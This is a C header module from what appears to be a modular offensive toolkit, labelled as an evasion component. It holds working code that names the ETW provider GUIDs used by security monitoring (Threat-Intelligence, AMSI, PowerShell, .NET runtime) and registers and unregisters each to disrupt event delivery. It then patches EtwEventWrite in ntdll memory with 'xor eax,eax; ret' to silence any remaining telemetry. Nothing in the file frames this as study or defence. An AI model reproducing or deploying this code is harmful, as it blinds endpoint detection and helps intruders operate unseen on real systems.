// chunk: evasion/etw_provider_unreg
// depends: (none)
// provides: patch_etw
// headers: windows.h
// risk: medium
// note: Targets EDR-specific ETW provider GUIDs — Microsoft-Windows-Threat-Intelligence and Microsoft-Antimalware-Scan-Interface. Registers each GUID to obtain a valid REGHANDLE, then immediately unregisters to disrupt the provider chain. Also patches EtwEventWrite as fallback for already-active providers.

#ifndef CHUNK_ETW_PROVIDER_UNREG
#define CHUNK_ETW_PROVIDER_UNREG

#include <windows.h>
#include <evntprov.h>

// Microsoft-Windows-Threat-Intelligence {F4E1897A-BB5D-5668-F1D8-040F4D8DD344}
static const GUID GUID_TI = {0xF4E1897A, 0xBB5D, 0x5668,
    {0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44}};

// Microsoft-Antimalware-Scan-Interface {2A576B87-09A7-520E-C21A-4942F0271D67}
static const GUID GUID_AMSI = {0x2A576B87, 0x09A7, 0x520E,
    {0xC2, 0x1A, 0x49, 0x42, 0xF0, 0x27, 0x1D, 0x67}};

// Microsoft-Windows-PowerShell {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
static const GUID GUID_PS = {0xA0C1853B, 0x5C40, 0x4B15,
    {0x87, 0x66, 0x3C, 0xF1, 0xC5, 0x8F, 0x98, 0x5A}};

// DotNETRuntime {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
static const GUID GUID_CLR = {0xE13C0D23, 0xCCBC, 0x4E12,
    {0x93, 0x1B, 0xD9, 0xCC, 0x2E, 0xEE, 0x27, 0xE4}};

typedef ULONG (NTAPI *pfnEtwEventRegister)(
    LPCGUID ProviderId,
    PENABLECALLBACK EnableCallback,
    PVOID CallbackContext,
    PREGHANDLE RegHandle
);

typedef ULONG (NTAPI *pfnEtwEventUnregister)(REGHANDLE RegHandle);

static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnEtwEventRegister pRegister = (pfnEtwEventRegister)
        GetProcAddress(ntdll, "EtwEventRegister");
    pfnEtwEventUnregister pUnregister = (pfnEtwEventUnregister)
        GetProcAddress(ntdll, "EtwEventUnregister");

    int disrupted = 0;

    if (pRegister && pUnregister) {
        const GUID *targets[] = {&GUID_TI, &GUID_AMSI, &GUID_PS, &GUID_CLR};

        for (int i = 0; i < 4; i++) {
            // Register ourselves as the provider — this can interfere with
            // the existing provider's event routing by claiming the GUID
            REGHANDLE handle = 0;
            ULONG status = pRegister(targets[i], NULL, NULL, &handle);
            if (status == 0 && handle != 0) {
                // Immediately unregister — removes this registration entry
                // from the ETW provider table, disrupting event delivery
                pUnregister(handle);
                disrupted++;
            }
        }
    }

    // Fallback: patch EtwEventWrite to silence any surviving providers
    BYTE *etw_write = (BYTE *)GetProcAddress(ntdll, "EtwEventWrite");
    if (etw_write) {
        BYTE patch[] = {0x33, 0xC0, 0xC3};  // xor eax,eax; ret
        DWORD old;
        if (VirtualProtect(etw_write, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
            for (unsigned i = 0; i < sizeof(patch); i++)
                etw_write[i] = patch[i];
            VirtualProtect(etw_write, sizeof(patch), old, &old);
            disrupted++;
        }
    }

    return disrupted > 0 ? 1 : 0;
}

#endif
